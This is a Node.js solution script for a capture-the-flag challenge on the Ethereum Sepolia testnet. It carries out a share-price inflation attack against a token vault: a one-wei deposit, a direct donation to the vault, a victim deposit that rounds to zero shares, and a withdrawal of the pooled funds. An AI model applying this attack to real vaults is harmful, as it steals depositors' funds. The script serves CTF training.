#!/usr/bin/env node
// Reference exploit for vault-inflation, using sdk/index.js.
//
//   1. spawn()                          → fresh Setup per player
//   2. read Setup → asset, vault, depositor
//   3. approve(vault, max)
//   4. deposit(1)                       // 1 share at price 1 wei
//   5. transfer(vault, 1001e18)         // donate to inflate the share price
//   6. depositor.triggerVictimDeposit() // victim's mint floors to 0
//   7. vault.withdraw(1)                // sweep the pot
//   8. ctf.claimFlag()

import { ethers } from "ethers";
import { Ctf } from "../../../sdk/index.js";

const required = ["PLAYER_KEY", "FACTORY", "BACKEND", "CHALLENGE"];
for (const k of required) {
  if (!process.env[k]) { console.error(`missing env ${k}`); process.exit(1); }
}

const RPC = process.env.RPC_URL ?? "https://ethereum-sepolia-rpc.publicnode.com";
const provider = new ethers.JsonRpcProvider(RPC);
const wallet   = new ethers.Wallet(process.env.PLAYER_KEY, provider);
const me = wallet.address;
console.log(`player: ${me}`);

const ctf = new Ctf({
  backend: process.env.BACKEND,
  challenge: process.env.CHALLENGE,
  player: me,
});

const factory = new ethers.Contract(process.env.FACTORY, [
  "function spawn() returns (address)",
  "function setupOf(address) view returns (address)",
], wallet);
const SETUP_ABI = [
  "function asset() view returns (address)",
  "function vault() view returns (address)",
  "function depositor() view returns (address)",
];
const ERC20 = [
  "function approve(address,uint256) returns (bool)",
  "function transfer(address,uint256) returns (bool)",
];
const VAULT = ["function deposit(uint256) returns (uint256)",
               "function withdraw(uint256) returns (uint256)"];
const DEP   = ["function triggerVictimDeposit()"];

async function ensureSetup() {
  let setup = await factory.setupOf(me);
  if (setup === ethers.ZeroAddress) {
    console.log("spawn()");
    await (await factory.spawn()).wait();
    setup = await factory.setupOf(me);
  }
  console.log(`setup: ${setup}`);
  return new ethers.Contract(setup, SETUP_ABI, wallet);
}

const setup = await ensureSetup();
const [assetAddr, vaultAddr, depAddr] = await Promise.all([
  setup.asset(), setup.vault(), setup.depositor(),
]);
const asset = new ethers.Contract(assetAddr, ERC20, wallet);
const vault = new ethers.Contract(vaultAddr, VAULT, wallet);
const dep   = new ethers.Contract(depAddr,   DEP,   wallet);

let nonce = await wallet.getNonce();
const tx = p => p.then(t => t.wait());

console.log("approve vault");
await tx(asset.approve(vaultAddr, ethers.MaxUint256, { nonce: nonce++ }));
console.log("deposit(1)");
await tx(vault.deposit(1, { nonce: nonce++ }));
console.log("donate 1001 USDC directly to vault");
await tx(asset.transfer(vaultAddr, ethers.parseEther("1001"), { nonce: nonce++ }));
console.log("trigger victim");
await tx(dep.triggerVictimDeposit({ nonce: nonce++ }));
console.log("withdraw(1)");
await tx(vault.withdraw(1, { nonce: nonce++ }));

const { flag } = await ctf.claimFlag({ poll: 6 });
console.log(`flag: ${flag}`);
